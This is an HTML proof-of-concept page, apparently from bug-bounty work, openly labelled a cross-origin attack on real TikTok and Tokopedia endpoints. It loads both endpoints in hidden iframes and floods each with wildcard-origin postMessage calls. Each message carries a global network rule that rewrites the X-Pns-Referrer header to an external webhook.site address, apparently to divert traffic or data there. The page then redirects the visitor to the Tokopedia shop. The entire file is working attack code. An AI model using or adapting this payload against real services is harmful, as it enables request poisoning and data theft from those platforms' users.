<!DOCTYPE html>
<html>
<body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;">
    <h1>[ PHASE: CROSS-ORIGIN ATTACK ]</h1>
    <p id="status">Discovering Target Context...</p>

    <iframe id="gate_tiktok" src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" style="display:none;"></iframe>
    <iframe id="gate_tokopedia" src="https://shop-id.tokopedia.com/api/v1/ping" style="display:none;"></iframe>

    <script>
        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";
        const payload = {
            source: "main_thread",
            eventName: "network_rule",
            data: [{
                ruleName: "final_global_poison",
                global: true,
                handlers: [{
                    handler: "replace",
                    type: "header",
                    field: "X-Pns-Referrer",
                    value: webhook
                }]
            }]
        };

        function infect(targetWindow) {
            for(let i=0; i<50; i++) {
                targetWindow.postMessage(payload, "*");
            }
        }

        window.onload = () => {
            document.getElementById('status').innerText = "Infecting both TikTok & Tokopedia Gateways...";
            
            // Tembak kedua iframe
            infect(document.getElementById('gate_tiktok').contentWindow);
            infect(document.getElementById('gate_tokopedia').contentWindow);

            setTimeout(() => {
                document.getElementById('status').innerText = "Attack Completed. Redirecting to Shop...";
                // Pindah ke domain shop yang menggunakan pns_logic.js
                location.href = "https://shop-id.tokopedia.com/";
            }, 5000);
        };
    </script>
</body>
</html>
